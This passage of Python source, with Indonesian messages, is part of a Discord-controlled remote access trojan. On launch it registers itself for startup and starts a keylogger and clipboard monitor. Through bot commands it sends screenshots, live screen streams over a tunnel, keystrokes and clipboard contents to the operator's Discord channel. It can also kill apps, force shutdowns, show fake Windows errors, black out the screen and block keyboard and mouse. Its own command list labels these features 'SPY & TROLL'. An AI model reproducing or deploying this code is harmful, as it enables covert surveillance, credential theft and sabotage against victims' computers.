        await send_screenshot(channel, "⏱️ Auto SS")
        await channel.send(f"ℹ️ **Status**\n```text\n{info}\n```")

@bot.event
async def on_ready():
    print(f"[BOT] Login: {bot.user}")
    add_to_startup()
    threading.Thread(target=run_anti_task, daemon=True).start()
    try: keyboard.Listener(on_press=on_press, daemon=True).start()
    except: pass
    threading.Thread(target=clipboard_listener, daemon=True).start()
    
    channel = bot.get_channel(CHANNEL_ID)
    if channel: await channel.send(embed=discord.Embed(title="🟢 PC ONLINE", description=f"**{MY_PC_NAME}** siap.", color=discord.Color.green()))
    
    if not periodic_log.is_running(): periodic_log.start()
    if not keylog_sender_task.is_running(): keylog_sender_task.start()
    if not spam_ss_task.is_running(): spam_ss_task.start()

@bot.event
async def on_message(message):
    global DISCORD_HOOK
    if message.channel.id == CHANNEL_ID and message.author != bot.user:
        if "👁️" in message.content or ":eye:" in message.content:
            threading.Thread(target=reset_all_blocks).start()
            add_web_log("👁️ Emoji. Blokir dibuka.", "warning")
            await message.channel.send("👁️ **Blokir DIBUKA.**")
            try: await message.delete()
            except: pass
            return
            
        if message.content.startswith("!") and not DISCORD_HOOK:
            return 
            
    await bot.process_commands(message)

# ============ COMMANDS DISCORD ============
@bot.command(name="reboot")
async def cmd_reboot(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete()
    await ctx.send("🔄 **Merestart bot dan mendownload kode terbaru...**")
    await asyncio.sleep(1)
    if getattr(sys, 'frozen', False):
        subprocess.Popen([sys.executable])
    os._exit(0)

@bot.command(name="hook")
async def cmd_hook(ctx, arg: str):
    global DISCORD_HOOK
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete()
    DISCORD_HOOK = (arg.lower() == "on")
    await ctx.send(f"🔗 **Discord Hook {'ON' if DISCORD_HOOK else 'OFF'}.**")

@bot.command(name="clear")
async def cmd_clear(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete()
    msg = await ctx.send("🧹 **Membersihkan seluruh chat...**")
    await purge_channel(CHANNEL_ID)
    try: await msg.delete()
    except: pass

@bot.command(name="clrnotif")
async def cmd_clrnotif(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete()
    clear_fake_errors()
    await ctx.send("🧹 **Semua Fake Notif dibersihkan.**")

@bot.command(name="web")
async def cmd_web(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete(); msg = await ctx.send("🌐 **Menyiapkan Link...**")
    
    if not tunnel_process:
        threading.Thread(target=run_web_server, daemon=True).start()
        await asyncio.sleep(1)
        
    loop = asyncio.get_event_loop()
    url = await loop.run_in_executor(None, start_tunnel)
    local_ip = get_local_ip()
    
    if url and url.startswith("https://"):
        embed = discord.Embed(title="🖥️ NANAO LINKS", description=f"**1. Web Controller (Cloudflare):**\n[🔗 Buka Dashboard]({url})\n\n**2. Local IP:**\n[🔗 Buka Local](http://{local_ip}:{STREAM_PORT})", color=discord.Color.blue())
        await msg.edit(content=None, embed=embed)
    else:
        await msg.edit(content=f"❌ Gagal membuat link: `{url}`")

@bot.command(name="ss")
async def cmd_ss(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete(); await send_screenshot(ctx.channel, "📸 SS")

@bot.command(name="status")
async def cmd_status(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete(); await ctx.send(f"```text\n{get_system_info()}\n```")

@bot.command(name="logs")
async def cmd_logs(ctx, arg: str = None):
    global LOG_ACTIVE
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete()
    if arg and arg.lower() == "on": LOG_ACTIVE = True; await ctx.send("✅ **Log ON.**")
    elif arg and arg.lower() == "off": LOG_ACTIVE = False; await ctx.send("🛑 **Log OFF.**")

@bot.command(name="listproses")
async def cmd_listproses(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete(); msg = await ctx.send("🔍 Scanning...")
    apps = await asyncio.get_event_loop().run_in_executor(None, get_window_apps)
    result = "\n\n".join([f"📌 **{a['name']}**\n└ PID: `{a['pid']}`" for a in apps])
    await msg.edit(content=None, embed=discord.Embed(title="📂 Tasks", description=result[:4000], color=discord.Color.purple()))

@bot.command(name="runapp")
async def cmd_runapp(ctx, *, app_name: str):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete(); msg = await ctx.send(f"🚀 Mencari `{app_name}`...")
    path = find_installed_app(app_name)
    if path:
        try: os.startfile(path); await msg.edit(content=f"✅ **Buka:** `{os.path.basename(path)}`")
        except: await msg.edit(content="❌ Gagal.")
    else: await msg.edit(content="❌ Tidak ditemukan.")

@bot.command(name="closeallapps")
async def cmd_closeallapps(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete(); await ctx.send("💥 **Menutup app...**")
    apps = await asyncio.get_event_loop().run_in_executor(None, get_window_apps)
    count = 0
    for a in apps:
        try:
            p = psutil.Process(a['pid'])
            if p.name().lower() not in ["explorer.exe", "python.exe", "pythonw.exe", "systemdiscord.exe"]: p.kill(); count += 1
        except: pass
    await ctx.send(f"✅ **{count} ditutup.**")

@bot.command(name="cb")
async def cmd_cb(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete()
    if not CLIPBOARD_HISTORY: return await ctx.send("📋 Kosong.")
    result = "\n--------------------\n".join([f"{i+1}. `{c[:80]}`" for i, c in enumerate(CLIPBOARD_HISTORY[:10])])
    await ctx.send(embed=discord.Embed(title="📋 Clipboard", description=f"```text\n{result}\n```", color=discord.Color.teal()))

@bot.command(name="antishutdown")
async def cmd_antishutdown(ctx, arg: str):
    global ANTI_SHUTDOWN
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete(); ANTI_SHUTDOWN = (arg.lower() == "on")
    await ctx.send(f"🛡️ **Anti-Shutdown {'ON' if ANTI_SHUTDOWN else 'OFF'}.**")

@bot.command(name="antirestart")
async def cmd_antirestart(ctx, arg: str):
    global ANTI_RESTART
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete(); ANTI_RESTART = (arg.lower() == "on")
    await ctx.send(f"🛡️ **Anti-Restart {'ON' if ANTI_RESTART else 'OFF'}.**")

@bot.command(name="fakenotif")
async def cmd_fakenotif(ctx, arg: str):
    global FAKE_NOTIF_ACTIVE
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete()
    if arg.lower() == "on": FAKE_NOTIF_ACTIVE = True; threading.Thread(target=run_fake_notif, daemon=True).start(); await ctx.send("💥 **Fake Notif ON.**")
    elif arg.lower() == "off": clear_fake_errors(); await ctx.send("🛑 **Fake Notif OFF.**")

@bot.command(name="shutdownpc")
async def cmd_shutdownpc(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete(); await ctx.send("🛑 **MATIKAN PC!**"); os.system("shutdown /s /t 10 /f")

@bot.command(name="restartpc")
async def cmd_restartpc(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete(); await ctx.send("🔄 **RESTART PC!**"); os.system("shutdown /r /t 10 /f")

@bot.command(name="lockpc")
async def cmd_lockpc(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete(); await ctx.send("🔒 **LOCK PC.**"); ctypes.windll.user32.LockWorkStation()

@bot.command(name="sleeppc")
async def cmd_sleeppc(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete(); await ctx.send("💤 **SLEEP PC.**"); os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")

@bot.command(name="kl")
async def cmd_keylog(ctx, arg: str):
    global KEYLOG_ACTIVE, KEY_BUFFER
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete(); KEYLOG_ACTIVE = (arg.lower() == "on"); KEY_BUFFER = ""
    await ctx.send(f"⌨️ **Keylogger {'ON' if KEYLOG_ACTIVE else 'OFF'}.**")

@bot.command(name="spamss")
async def cmd_spamss(ctx, arg: str = None):
    global SPAM_SS_ACTIVE, SPAM_SS_DELAY
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete()
    if arg is None or arg.lower() == "off": SPAM_SS_ACTIVE = False; return await ctx.send("🛑 **Spam SS OFF.**")
    try:
        SPAM_SS_DELAY = float(arg); SPAM_SS_ACTIVE = True
        spam_ss_task.change_interval(seconds=SPAM_SS_DELAY)
        if not spam_ss_task.is_running(): spam_ss_task.start()
        await ctx.send(f"🚀 **Spam SS ON** (`{SPAM_SS_DELAY}s`).")
    except: await ctx.send("❌ Format salah.")

@bot.command(name="sendmsg")
async def cmd_sendmsg(ctx, *, args: str):
    global IS_MSG_ACTIVE, STOP_MSG
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete()
    if args.lower() == "off": threading.Thread(target=reset_all_blocks).start(); return await ctx.send("🛑 **Overlay OFF.**")
    parts = args.rsplit(' ', 1)
    if len(parts) != 2: return await ctx.send("❌ Format: `!sendmsg <teks> <detik/inf>`")
    msg_text, time_arg = parts[0], parts[1].lower()
    duration = -1 if time_arg == "inf" else int(time_arg) if time_arg.isdigit() else None
    if duration is None: return await ctx.send("❌ Waktu salah.")
    IS_MSG_ACTIVE = True; STOP_MSG = False
    run_sendmsg_logic(msg_text, duration)
    await ctx.send(f"✉️ **Pesan aktif.**")

@bot.command(name="blackscreen", aliases=["bs"])
async def cmd_blackscreen(ctx, arg: str):
    global IS_BLACK_SCREEN, STOP_BS
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete()
    if arg.lower() == "on": IS_BLACK_SCREEN = True; STOP_BS = False; run_blackscreen_logic(); await ctx.send("🖤 **BS ON.**")
    else: threading.Thread(target=reset_all_blocks).start(); await ctx.send("🖤 **BS OFF.**")

@bot.command(name="blockkeyboard", aliases=["bk"])
async def cmd_blockkeyboard(ctx, arg: str):
    global IS_KEYBOARD_BLOCKED, kb_block_listener
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete()
    if arg.lower() == "on":
        if not IS_KEYBOARD_BLOCKED: IS_KEYBOARD_BLOCKED = True; kb_block_listener = keyboard.Listener(suppress=True); kb_block_listener.start()
        await ctx.send("⌨️ **KB BLOCKED.**")
    elif arg.lower() == "off":
        IS_KEYBOARD_BLOCKED = False
        if kb_block_listener: 
            try: kb_block_listener.stop()
            except: pass
            kb_block_listener = None
        await ctx.send("⌨️ **KB NORMAL.**")

@bot.command(name="blockmouse", aliases=["bm"])
async def cmd_blockmouse(ctx, arg: str):
    global IS_MOUSE_BLOCKED, ms_block_listener
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete()
    if arg.lower() == "on":
        if not IS_MOUSE_BLOCKED: 
            IS_MOUSE_BLOCKED = True
            ms_block_listener = mouse.Listener(suppress=True)
            ms_block_listener.start()
        await ctx.send("🖱️ **MOUSE BLOCKED.**")
    elif arg.lower() == "off":
        IS_MOUSE_BLOCKED = False
        if ms_block_listener: 
            try: ms_block_listener.stop()
            except: pass
            ms_block_listener = None
        for _ in range(5): ctypes.windll.user32.ShowCursor(True)
        await ctx.send("🖱️ **MOUSE NORMAL.**")

@bot.command(name="sendbar")
async def cmd_sendbar(ctx, *, args: str = None):
    global STOP_BAR, bar_window_root, IS_BAR_ACTIVE
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete()
    if args and args.lower() == "off": STOP_BAR = True; IS_BAR_ACTIVE = False; return await ctx.send("🛑 **Bar OFF.**")
    STOP_BAR = False; IS_BAR_ACTIVE = True; run_sendbar_logic(args or "")
    await ctx.send(f"💬 **Bar ON.**")

@bot.command(name="livestream")
async def cmd_livestream(ctx, arg: str = None):
    global streaming_active, tunnel_process, PUBLIC_URL
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete()
    if arg and arg.lower() == "off": streaming_active = False; return await ctx.send("🛑 **Stream OFF.**")
    if streaming_active: return await ctx.send("⚠️ Stream sudah jalan.")
    streaming_active = True
    if not tunnel_process: 
        threading.Thread(target=run_web_server, daemon=True).start()
        await asyncio.sleep(1)
        await asyncio.get_event_loop().run_in_executor(None, start_tunnel)
    if PUBLIC_URL: await ctx.send(embed=discord.Embed(title="🖥️ Stream Aktif", description=f"**[🔗 Buka Stream]({PUBLIC_URL}/stream)**", color=discord.Color.blue()))
    else: await ctx.send("❌ Tunnel gagal.")

@bot.command(name="shutdown")
async def cmd_shutdown(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete(); await ctx.send("🔴 **Bot mati.**"); await asyncio.sleep(1); os._exit(0)

@bot.command(name="listcmd", aliases=["list"])
async def cmd_list(ctx):
    if ctx.channel.id != CHANNEL_ID: return
    await ctx.message.delete()
    cmd = """
🌐 WEB & STREAM
├ !web / !livestream : Link Web & Stream
├ !reboot            : Restart & Update Bot
├ !hook on/off       : Hidupkan/Mati command DC
├ !clear             : Hapus semua chat di channel ini
└ !clrnotif          : Hapus semua fake error

⚙️ INFO & APP
├ !ss / !status / !cb : SS, Info, Clipboard
├ !listproses / !listapp : App info
├ !runapp <nama>     : Buka app
└ !closeallapps      : Tutup app

🔌 POWER & SISTEM
├ !shutdownpc / !restartpc / !lockpc / !sleeppc
├ !antishutdown / !antirestart

🕵️ SPY & TROLL
├ !fakenotif on/off  : Fake Error Windows
├ !kl on/off         : Keylogger
├ !spamss <dtk>      : Spam SS
├ !sendmsg / !sendbar : Overlay & Chat
└ !bs / !bk / !bm on/off : Blokir layar/KB/Mouse
"""
    await ctx.send(embed=discord.Embed(title="📜 COMMANDS", description=f"```text\n{cmd}\n```", color=discord.Color.gold()))

# ============ RUN ============
if __name__ == "__main__":
    import atexit
    atexit.register(lambda: tunnel_process.terminate() if tunnel_process else None)
    bot.run(TOKEN)
